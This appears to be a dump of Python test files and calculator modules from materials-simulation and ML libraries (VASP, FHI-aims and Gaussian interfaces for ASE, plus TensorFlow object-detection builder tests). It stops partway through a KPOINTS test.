   atoms = prep_next_run(atoms)\n    atoms *= (2, 2, 2)\n    calc = Vasp(atoms, preset=\"BulkSet\")\n    atoms.calc = calc\n    np.all(atoms.get_initial_magnetic_moments() == 0.0)\n\n    atoms = bulk(\"Mg\")\n    calc = Vasp(atoms)\n    atoms.calc = calc\n    atoms.calc.results = {\"energy\": -1.0}\n    atoms = prep_next_run(atoms)\n    atoms *= (2, 2, 2)\n    calc = Vasp(atoms, preset=\"BulkSet\")\n    atoms.calc = calc\n    np.all(atoms.get_initial_magnetic_moments() == 0.0)\n\n    atoms = bulk(\"Mg\")\n    calc = Vasp(atoms, preset=\"BulkSet\")\n    atoms.calc = calc\n    atoms.calc.results = {\"energy\": -1.0, \"magmoms\": [3.14] * len(atoms)}\n    atoms = prep_next_run(atoms)\n    atoms *= (2, 2, 2)\n    calc = Vasp(atoms, preset=\"BulkSet\")\n    atoms.calc = calc\n    np.all(atoms.get_initial_magnetic_moments() == 3.14)\n\n\ndef test_unused_flags():\n    atoms = bulk(\"Cu\")\n    calc = Vasp(atoms, preset=\"BulkSet\", potim=1.5, nsw=0)\n    assert calc.int_params[\"nsw\"] == 0\n    assert calc.exp_params[\"ediffg\"] is None\n    assert calc.int_params[\"isif\"] is None\n    assert calc.float_params[\"potim\"] is None\n\n    calc = Vasp(atoms, ldau=False, ldauprint=2)\n    assert calc.int_params[\"ldauprint\"] is None\n    assert calc.bool_params[\"ldau\"] is None\n\n\ndef test_lasph():\n    atoms = bulk(\"Cu\")\n\n    calc = Vasp(atoms, xc=\"rpbe\")\n    assert calc.bool_params[\"lasph\"] is None\n\n    calc = Vasp(atoms, xc=\"m06l\")\n    assert calc.bool_params[\"lasph\"] is True\n\n    calc = Vasp(atoms, xc=\"m06l\", lasph=False)\n    assert calc.bool_params[\"lasph\"] is True\n\n    calc = Vasp(atoms, xc=\"hse06\")\n    assert calc.bool_params[\"lasph\"] is True\n\n    calc = Vasp(atoms, xc=\"beef-vdw\")\n    assert calc.bool_params[\"lasph\"] is True\n\n    calc = Vasp(atoms, ldau_luj={\"Cu\": {\"L\": 2, \"U\": 5, \"J\": 0.0}})\n    assert calc.bool_params[\"lasph\"] is True\n\n\ndef test_lmaxtau():\n    atoms = bulk(\"Cu\")\n    calc = Vasp(atoms, lasph=True)\n    assert calc.int_params[\"lmaxtau\"] is None\n\n    atoms = bulk(\"Ce\")\n    calc = Vasp(atoms, lasph=True)\n    assert calc.int_params[\"lmaxtau\"] == 8\n\n    atoms = bulk(\"Cu\") * (2, 2, 2)\n    atoms[-1].symbol = \"Ce\"\n    calc = Vasp(atoms, lasph=True)\n    assert calc.int_params[\"lmaxtau\"] == 8\n\n\ndef test_algo():\n    atoms = bulk(\"Cu\")\n\n    calc = Vasp(atoms, xc=\"rpbe\")\n    assert calc.string_params[\"algo\"] is None\n\n    calc = Vasp(atoms, xc=\"m06l\")\n    assert calc.string_params[\"algo\"] == \"all\"\n\n    calc = Vasp(atoms, xc=\"m06l\", algo=\"fast\")\n    assert calc.string_params[\"algo\"] == \"all\"\n\n    calc = Vasp(atoms, xc=\"hse06\")\n    assert calc.string_params[\"algo\"] == \"damped\"\n    assert calc.float_params[\"time\"] == 0.5\n\n    atoms[0].symbol = \"H\"\n    calc = Vasp(atoms, xc=\"hse06\")\n    assert calc.string_params[\"algo\"] == \"all\"\n\n\ndef test_kpar():\n    atoms = bulk(\"Cu\")\n\n    calc = Vasp(atoms, kpts=[2, 2, 1], kpar=4)\n    assert calc.int_params[\"kpar\"] == 4\n\n    calc = Vasp(atoms, kpar=4)\n    assert calc.int_params[\"kpar\"] == 1\n\n\ndef test_isym():\n    atoms = bulk(\"Cu\")\n\n    calc = Vasp(atoms, isym=2)\n    assert calc.int_params[\"isym\"] == 2\n\n    calc = Vasp(atoms, isym=0)\n    assert calc.int_params[\"isym\"] == 0\n\n    calc = Vasp(atoms, xc=\"hse06\", isym=2)\n    assert calc.int_params[\"isym\"] == 3\n\n    calc = Vasp(atoms, isym=2, nsw=100)\n    assert calc.int_params[\"isym\"] == 0\n\n    calc = Vasp(atoms, xc=\"hse06\", isym=2, nsw=100)\n    assert calc.int_params[\"isym\"] == 0\n\n\ndef test_ncore():\n    atoms = bulk(\"Cu\")\n\n    calc = Vasp(atoms, ncore=16)\n    assert calc.int_params[\"ncore\"] == 1\n\n    calc = Vasp(atoms, npar=16)\n    assert calc.int_params[\"ncore\"] == 1\n    assert calc.int_params[\"npar\"] is None\n\n    atoms *= (2, 2, 2)\n    calc = Vasp(atoms, ncore=4)\n    assert calc.int_params[\"ncore\"] == 4\n\n    calc = Vasp(atoms, ncore=4, lhfcalc=True)\n    assert calc.int_params[\"ncore\"] == 1\n\n    calc = Vasp(atoms, npar=4, lhfcalc=True)\n    assert calc.int_params[\"ncore\"] == 1\n    assert calc.int_params[\"npar\"] is None\n\n\ndef test_ismear():\n    atoms = bulk(\"Cu\")\n\n    calc = Vasp(atoms, nsw=10)\n    assert calc.int_params[\"ismear\"] is None\n\n    calc = Vasp(atoms, ismear=-5, nsw=10)\n    assert calc.int_params[\"ismear\"] == 1\n    assert calc.float_params[\"sigma\"] == 0.1\n\n    calc = Vasp(atoms, ismear=-5, nsw=0)\n    assert calc.int_params[\"ismear\"] == 0\n\n    calc = Vasp(atoms, kpts=(10, 10, 10), ismear=-5, nsw=0)\n    assert calc.int_params[\"ismear\"] == -5\n\n    calc = Vasp(atoms, ismear=0, nsw=10)\n    assert calc.int_params[\"ismear\"] == 0\n\n    calc = Vasp(atoms, nedos=3001, nsw=0)\n    assert calc.int_params[\"ismear\"] == 0\n\n    calc = Vasp(atoms, ismear=-5, nedos=3001, nsw=0)\n    assert calc.int_params[\"ismear\"] == 0\n\n    calc = Vasp(atoms, kpts=(10, 10, 10), nedos=3001, nsw=0)\n    assert calc.int_params[\"ismear\"] == -5\n\n    calc = Vasp(atoms, auto_kpts={\"line_density\": 100}, ismear=1)\n    assert calc.int_params[\"ismear\"] == 0\n    assert calc.float_params[\"sigma\"] == 0.01\n\n    calc = Vasp(atoms, auto_kpts={\"line_density\": 100}, ismear=0, sigma=1e-3)\n    assert calc.int_params[\"ismear\"] == 0\n    assert calc.float_params[\"sigma\"] == 1e-3\n\n    calc = Vasp(atoms, auto_kpts={\"line_density\": 100}, ismear=-5)\n    assert calc.int_params[\"ismear\"] == 0\n\n    calc = Vasp(atoms, kspacing=1.0, ismear=-5)\n    assert calc.int_params[\"ismear\"] == 0\n    assert calc.float_params[\"sigma\"] == 0.05\n\n    calc = Vasp(atoms, nsw=0, kspacing=1.0, ismear=1, sigma=0.1)\n    assert calc.int_params[\"ismear\"] == 1\n    assert calc.float_params[\"sigma\"] == 0.1\n\n    atoms[0].symbol = \"H\"\n    calc = Vasp(atoms, kpts=(10, 10, 10), ismear=-5, nsw=10)\n    assert calc.int_params[\"ismear\"] == -5\n\n\ndef test_laechg():\n    atoms = bulk(\"Cu\")\n    calc = Vasp(atoms, nsw=10, laechg=True)\n    assert not calc.bool_params[\"laechg\"]\n\n    calc = Vasp(atoms, laechg=True)\n    assert calc.bool_params[\"laechg\"]\n\n    calc = Vasp(atoms, nsw=0, laechg=True)\n    assert calc.bool_params[\"laechg\"]\n\n    calc = Vasp(atoms, nsw=0, laechg=False)\n    assert not calc.bool_params[\"laechg\"]\n\n\ndef test_ldauprint():\n    atoms = bulk(\"Cu\")\n\n    calc = Vasp(atoms, ldau=True)\n    assert calc.int_params[\"ldauprint\"] == 1\n\n    calc = Vasp(atoms, ldau=True, ldauprint=0)\n    assert calc.int_params[\"ldauprint\"] == 1\n\n    calc = Vasp(atoms, ldau=False, ldauprint=1)\n    assert calc.int_params[\"ldauprint\"] is None\n\n    calc = Vasp(atoms, ldau_luj={\"Cu\": {\"L\": 2, \"U\": 5, \"J\": 0.0}})\n    assert calc.int_params[\"ldauprint\"] == 1\n\n\ndef test_lreal():\n    atoms = bulk(\"Cu\")\n    calc = Vasp(atoms, lreal=True, nsw=0)\n    assert calc.special_params[\"lreal\"] is False\n\n    calc = Vasp(atoms, lreal=True, nsw=10)\n    assert calc.special_params[\"lreal\"] is True\n\n    calc = Vasp(atoms, nsw=10)\n    assert calc.special_params[\"lreal\"] is None\n\n\ndef test_lorbit():\n    atoms = bulk(\"Cu\")\n    calc = Vasp(atoms, ispin=2)\n    assert calc.int_params[\"lorbit\"] == 11\n\n    atoms = bulk(\"Cu\")\n    calc = Vasp(atoms, ispin=1)\n    assert calc.int_params[\"lorbit\"] is None\n\n    atoms = bulk(\"Cu\")\n    atoms.set_initial_magnetic_moments([1.0] * len(atoms))\n    calc = Vasp(atoms)\n    assert calc.int_params[\"lorbit\"] == 11\n\n\ndef test_setups():\n    atoms = bulk(\"Cu\")\n    calc = Vasp(atoms, preset=\"BulkSet\")\n    assert calc.parameters[\"setups\"][\"Cu\"] == \"\"\n\n    atoms = bulk(\"Cu\")\n    calc = Vasp(atoms, preset=\"SlabSet\")\n    assert calc.parameters[\"setups\"][\"Ba\"] == \"_sv\"\n    assert calc.parameters[\"setups\"][\"Cu\"] == \"\"\n\n    atoms = bulk(\"Cu\")\n    calc = Vasp(atoms, preset=\"MPScanSet\")\n    assert calc.parameters[\"setups\"][\"Cu\"] == \"_pv\"\n\n    atoms = bulk(\"Cu\")\n    Vasp(\n        atoms,\n        setups=os.path.join(FILE_DIR, \"test_setups.yaml\"),\n        preset=\"BulkSet\",\n    )\n    assert calc.parameters[\"setups\"][\"Cu\"] == \"_pv\"\n\n    atoms = bulk(\"Cu\")\n    Vasp(\n        atoms,\n        setups=\"setups_pbe54_MP.yaml\",\n        preset=\"BulkSet\",\n    )\n    assert calc.parameters[\"setups\"][\"Cu\"] == \"_pv\"\n\n    atoms = bulk(\"Cu\")\n    calc = Vasp(atoms, setups=\"minimal\", preset=\"MPScanSet\")\n    assert (\n        isinstance(calc.parameters[\"setups\"], str)\n        and calc.parameters[\"setups\"] == \"minimal\"\n    )\n\n    atoms = bulk(\"Cu\")\n    calc = Vasp(atoms, preset=\"QMOFSet\")\n    assert calc.parameters[\"setups\"][\"Cu\"] == \"\"\n    assert calc.parameters[\"setups\"][\"Er\"] == \"_3\"\n    assert calc.parameters[\"setups\"][\"Yb\"] == \"_3\"\n\n\ndef test_kpoint_schemes():\n    atoms = bulk(\"Cu\")\n    calc = Vasp(atoms, kpts=[1, 1, 1], preset=\"BulkSet\")\n    assert calc.kpts == [1, 1, 1]\n\n    atoms = bulk(\"Cu\")\n    calc = Vasp(atoms, auto_kpts={\"grid_density\": 1000}, gamma=False)\n    assert calc.kpts == [10, 10, 10]\n    assert calc.input_params[\"gamma\"] is False\n\n    atoms = bulk(\"Cu\")\n    calc = Vasp(atoms, auto_kpts={\"grid_density\": 1000})\n    assert calc.kpts == [10, 10, 10]\n    assert calc.input_params[\"gamma\"] is True\n\n    atoms = bulk(\"Cu\")\n    calc = Vasp(\n        atoms,\n        preset=\"BulkSet\",\n        auto_kpts={\"grid_density\": 1000},\n        gamma=False,\n    )\n    atoms.calc = calc\n    assert calc.kpts == [10, 10, 10]\n    assert calc.input_params[\"gamma\"] is False\n\n    atoms = bulk(\"Cu\")\n    calc = Vasp(atoms, auto_kpts={\"grid_density\": 1000}, gamma=True)\n    assert calc.kpts == [10, 10, 10]\n    assert calc.input_params[\"gamma\"] is True\n\n    atoms = bulk(\"Cu\")\n    calc = Vasp(atoms, auto_kpts={\"reciprocal_density\": 100})\n    assert calc.kpts == [12, 12, 12]\n\n    atoms = bulk(\"Cu\")\n    calc = Vasp(atoms, auto_kpts={\"max_mixed_density\": [100, 1000]})\n    assert calc.kpts == [12, 12, 12]\n\n    atoms = bulk(\"Cu\")\n    calc = Vasp(atoms, auto_kpts={\"max_mixed_density\": [10, 1000]})\n    assert calc.kpts == [10, 10, 10]\n\n    atoms = bulk(\"Cu\")\n    calc = Vasp(atoms, auto_kpts={\"length_density\": [50, 50, 1]})\n    assert calc.kpts == [20, 20, 1]\n\n    atoms = bulk(\"Cu\")\n    calc = Vasp(atoms, auto_kpts={\"line_density\": 100})\n    assert calc.kpts[-1] == pytest.approx(\n        np.array([1.30537091e00, 1.11022302e-16, 1.30537091e00])\n    )\n\n\ndef test_constraints():\n    atoms = bulk(\"Cu\")\n    atoms.set_constraint(FixAtoms(indices=[0]))\n    calc = Vasp(atoms)\n    atoms.calc = calc\n    assert isinstance(atoms.constraints[0], FixAtoms)\n\n    atoms = bulk(\"Cu\") * (2, 1, 1)\n    atoms.set_constraint(FixBondLength(0, 1))\n    with pytest.raises(ValueError):\n        calc = Vasp(atoms)\n\n\ndef test_bad():\n    atoms = bulk(\"Cu\")\n    with pytest.raises(ValueError):\n        Vasp(atoms, auto_kpts={\"max_mixed_density\": [100]})\n\n    with pytest.raises(ValueError):\n        Vasp(atoms, auto_kpts={\"length_density\": [100]})\n\n    with pytest.raises(ValueError):\n        Vasp(atoms, auto_kpts={\"test\": [100]})\n\n    with pytest.warns(Warning):\n        Vasp(atoms, auto_kpts={\"max_mixed_density\": [1000, 100]})\n\n    with pytest.raises(ValueError):\n        Vasp(atoms, preset=\"BadRelaxSet\")\n", "142": "import tempfile\nimport os\n\nfrom ase.calculators.aims import Aims\nfrom ase import Atoms\n\n# test the new command handling + legacy behavior\naims_command = 'aims.x'\naims_command_alternative = 'mpirun -np 4 fhiaims.x'\noutfilename = 'alternative_aims.out'\noutfilename_default = 'aims.out'\ncommand = '{0:s} > {1:s}'.format(aims_command, outfilename)\ncommand_alternative = '{0:s} > {1:s}'.format(aims_command_alternative, outfilename)\ncommand_default = '{0:s} > {1:s}'.format(aims_command, outfilename_default)\nlegacy_command = 'aims.version.serial.x > aims.out'\nlegacy_aims_command = legacy_command.split('>')[0].strip()\nlegacy_outfilename = legacy_command.split('>')[-1].strip()\n\n# legacy behavior of empty init\ncalc = Aims()\nassert calc.command == legacy_command\nassert calc.outfilename == legacy_outfilename\nassert calc.aims_command == legacy_aims_command\n\n# behavior of empty init with env variable\nos.environ['ASE_AIMS_COMMAND'] = aims_command_alternative\ncalc = Aims()\nassert calc.command == '{0} > {1}'.format(aims_command_alternative, outfilename_default)\nassert calc.outfilename == outfilename_default\nassert calc.aims_command == aims_command_alternative\n\n# legacy behavior of \"proper\" command\ncalc = Aims(run_command=command)\nassert calc.command == command\nassert calc.outfilename == outfilename\nassert calc.aims_command == aims_command\n\n# legacy behavior of an \"improper\" command\ncalc = Aims(run_command=aims_command)\nassert calc.command == command_default\nassert calc.aims_command == aims_command\nassert calc.outfilename == outfilename_default\n\n# fixed \"command\"  behavior\ncalc = Aims(command=command)\nassert calc.command == command\nassert calc.outfilename == outfilename\nassert calc.aims_command == aims_command\n\n# novel way to use aims_command, no specific outfile\ncalc = Aims(aims_command=aims_command)\nassert calc.command == command_default\nassert calc.outfilename == outfilename_default\nassert calc.aims_command == aims_command\n\ncalc = Aims(aims_command=aims_command,\n            outfilename=outfilename)\nassert calc.command == command\nassert calc.outfilename == outfilename\nassert calc.aims_command == aims_command\n\n# # testing the setters\ncalc.command = command_default\nassert calc.outfilename == outfilename_default\nassert calc.aims_command == aims_command\nassert calc.command == command_default\n\n#calc.set_aims_command(aims_command_alternative)\ncalc.aims_command = aims_command_alternative\nassert calc.aims_command == aims_command_alternative\nassert calc.outfilename == outfilename_default\nassert calc.command == '{} > {}'.format(aims_command_alternative, outfilename_default)\n\ncalc.outfilename = outfilename\nassert calc.command == '{} > {}'.format(aims_command_alternative, outfilename)\nassert calc.aims_command == aims_command_alternative\nassert calc.outfilename == outfilename\n\n\n# test writing files\ntmp_dir = tempfile.mkdtemp()\nwater = Atoms('HOH', [(1, 0, 0), (0, 0, 0), (0, 1, 0)])\ncalc = Aims(xc='PBE',\n            output=['dipole'],\n            sc_accuracy_etot=1e-6,\n            sc_accuracy_eev=1e-3,\n            sc_accuracy_rho=1e-6,\n            species_dir=\"/data/rittmeyer/FHIaims/species_defaults/light/\",\n            sc_accuracy_forces=1e-4,\n            label=tmp_dir,\n            )\ntry:\n    calc.prepare_input_files()\n    raise AssertionError\nexcept ValueError:\n    pass\n\ncalc.atoms = water\ncalc.prepare_input_files()\nfor f in ['control.in', 'geometry.in']:\n    assert os.path.isfile(os.path.join(tmp_dir,f))\n", "143": "import os\nimport copy\nfrom collections.abc import Iterable\nfrom shutil import which\nfrom typing import Dict, Optional\n\nfrom ase.io import read, write\nfrom ase.calculators.calculator import FileIOCalculator, EnvironmentError\n\n\nclass GaussianDynamics:\n    calctype = 'optimizer'\n    delete = ['force']\n    keyword: Optional[str] = None\n    special_keywords: Dict[str, str] = dict()\n\n    def __init__(self, atoms, calc=None):\n        self.atoms = atoms\n        if calc is not None:\n            self.calc = calc\n        else:\n            if self.atoms.calc is None:\n                raise ValueError(\"{} requires a valid Gaussian calculator \"\n                                 \"object!\".format(self.__class__.__name__))\n\n            self.calc = self.atoms.calc\n\n    def todict(self):\n        return {'type': self.calctype,\n                'optimizer': self.__class__.__name__}\n\n    def delete_keywords(self, kwargs):\n        \"\"\"removes list of keywords (delete) from kwargs\"\"\"\n        for d in self.delete:\n            kwargs.pop(d, None)\n\n    def set_keywords(self, kwargs):\n        args = kwargs.pop(self.keyword, [])\n        if isinstance(args, str):\n            args = [args]\n        elif isinstance(args, Iterable):\n            args = list(args)\n\n        for key, template in self.special_keywords.items():\n            if key in kwargs:\n                val = kwargs.pop(key)\n                args.append(template.format(val))\n\n        kwargs[self.keyword] = args\n\n    def run(self, **kwargs):\n        calc_old = self.atoms.calc\n        params_old = copy.deepcopy(self.calc.parameters)\n\n        self.delete_keywords(kwargs)\n        self.delete_keywords(self.calc.parameters)\n        self.set_keywords(kwargs)\n\n        self.calc.set(**kwargs)\n        self.atoms.calc = self.calc\n\n        try:\n            self.atoms.get_potential_energy()\n        except OSError:\n            converged = False\n        else:\n            converged = True\n\n        atoms = read(self.calc.label + '.log')\n        self.atoms.cell = atoms.cell\n        self.atoms.positions = atoms.positions\n\n        self.calc.parameters = params_old\n        self.calc.reset()\n        if calc_old is not None:\n            self.atoms.calc = calc_old\n\n        return converged\n\n\nclass GaussianOptimizer(GaussianDynamics):\n    keyword = 'opt'\n    special_keywords = {\n        'fmax': '{}',\n        'steps': 'maxcycle={}',\n    }\n\n\nclass GaussianIRC(GaussianDynamics):\n    keyword = 'irc'\n    special_keywords = {\n        'direction': '{}',\n        'steps': 'maxpoints={}',\n    }\n\n\nclass Gaussian(FileIOCalculator):\n    implemented_properties = ['energy', 'forces', 'dipole']\n    command = 'GAUSSIAN < PREFIX.com > PREFIX.log'\n    discard_results_on_any_change = True\n\n    def __init__(self, *args, label='Gaussian', **kwargs):\n        FileIOCalculator.__init__(self, *args, label=label, **kwargs)\n\n    def calculate(self, *args, **kwargs):\n        gaussians = ('g16', 'g09', 'g03')\n        if 'GAUSSIAN' in self.command:\n            for gau in gaussians:\n                if which(gau):\n                    self.command = self.command.replace('GAUSSIAN', gau)\n                    break\n            else:\n                raise EnvironmentError('Missing Gaussian executable {}'\n                                       .format(gaussians))\n\n        FileIOCalculator.calculate(self, *args, **kwargs)\n\n    def write_input(self, atoms, properties=None, system_changes=None):\n        FileIOCalculator.write_input(self, atoms, properties, system_changes)\n        write(self.label + '.com', atoms, properties=properties,\n              format='gaussian-in', parallel=False, **self.parameters)\n\n    def read_results(self):\n        output = read(self.label + '.log', format='gaussian-out')\n        self.calc = output.calc\n        self.results = output.calc.results\n\n    # Method(s) defined in the old calculator, added here for\n    # backwards compatibility\n    def clean(self):\n        for suffix in ['.com', '.chk', '.log']:\n            try:\n                os.remove(os.path.join(self.directory, self.label + suffix))\n            except OSError:\n                pass\n\n    def get_version(self):\n        raise NotImplementedError  # not sure how to do this yet\n", "144": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow.compat.v1 as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "145": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "146": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "147": "from ase.test.calculator.vasp.filecmp_ignore_whitespace import (\n    filecmp_ignore_whitespace)\n\ndef test_vasp2_kpoints(require_vasp):\n    \"\"\"\n\n    Check the many ways of specifying KPOINTS\n\n    \"\"\"\n\n    import os\n\n    from ase.calculators.vasp import Vasp2 as Vasp\n    from ase.build import bulk\n    from ase.test.calculator.vasp import installed2 as installed\n\n    assert installed()\n\n\n    Al = bulk('Al', 'fcc', a=4.5, cubic=True)\n\n\n    def check_kpoints_line(n, contents):\n        \"\"\"Assert the contents of a line\"\"\"\n        with open('KPOINTS', 'r') as f:\n            lines = f.readlines()\n            assert lines[n] == contents\n\n    # Default to (1 1 1)\n\n    calc = Vasp(gamma=True)\n    calc.write_kpoints()\n    check_kpoints_line(2, 'Gamma\\n')\n    check_kpoints_line(3, '1 1 1 \\n')\n    calc.clean()\n\n    # 3-tuple prints mesh\n    calc = Vasp(gamma=False, kpts=(4, 4, 4))\n    calc.write_kpoints()\n    check_kpoints_line(2, 'Monkhorst-Pack\\n')\n    check_kpoints_line(3, '4 4 4 \\n')\n    calc.clean()\n\n    # Auto mode\n    calc = Vasp(kpts=20)\n    calc.write_kpoints()\n    check_kpoints_line(1, '0\\n')\n    check_kpoints_line(2, 'Auto\\n')\n    check_kpoints_line(3, '20 \\n')\n    calc.clean()\n\n    # 1-element list ok, Gamma ok\n    calc = Vasp(kpts=[20], gamma=True)\n    calc.write_kpoints()\n    check_kpoints_line(1, '0\\n')\n    check_kpoints_line(2, 'Auto\\n')\n    check_kpoints_line(3, '20 \\n')\n    calc.clean()\n\n    # KSPACING suppresses KPOINTS file\n    calc = Vasp(kspacing=0.23)\n    calc.initialize(Al)\n    calc.write_kpoints()\n    calc.write_incar(Al)\n    assert not os.path.isfile('KPOINTS')\n    with open('INCAR', 'r') as f:\n        assert ' KSPACING = 0.230000\\n' in f.readlines()\n    calc.clean()\n\n    # Negative KSPACING raises an error\n    calc = Vasp(kspacing=-0.5)\n\n    try:\n        calc.write_kpoints()\n    except ValueError:\n        pass\n    else:\n        raise AssertionError(\"Negative KSPACING did not raise ValueError\")\n    calc.clean()\n\n    # Explicit weighted points with nested lists, Cartesian if not specified\n    calc = Vasp(\n        kpts=[[0.1, 0.2, 0.3, 2], [0.0, 0.0, 0.0, 1], [0.0, 0.5, 0.5, 2]])\n    calc.write_kpoints()\n\n    with open('KPOINTS.ref', 'w') as f:\n        f.write(\"\"\"KPOINTS created by Atomic Simulation Environment\n    3 \n    Cartesian\n    0.100000 0.200000 0.300000 2.000000 \n    0.000000 0.000000 0.000000 1.000000 \n    0.000000 0.500000 0.500000 2.000000 \n    \"\"\")\n\n    assert filecmp_ignore_whitespace('KPOINTS', 'KPOINTS.ref')\n    os.remove('KPOINTS.ref')\n\n    # Explicit points as list of tuples, automatic weighting = 1.\n    calc = Vasp(\n        kpts=[(0.1, 0.2, 0.3), (0.0, 0.0, 0.0), (0.0, 0.5, 0.5)], reciprocal=True)\n    calc.write_kpoints()\n\n    with open('KPOINTS.ref', 'w') as f:\n        f.write(\"\"\"KPOINTS created by Atomic Simulation Environment\n    3 \n    Reciprocal\n    0.100000 0.200000 0.300000 1.0 \n    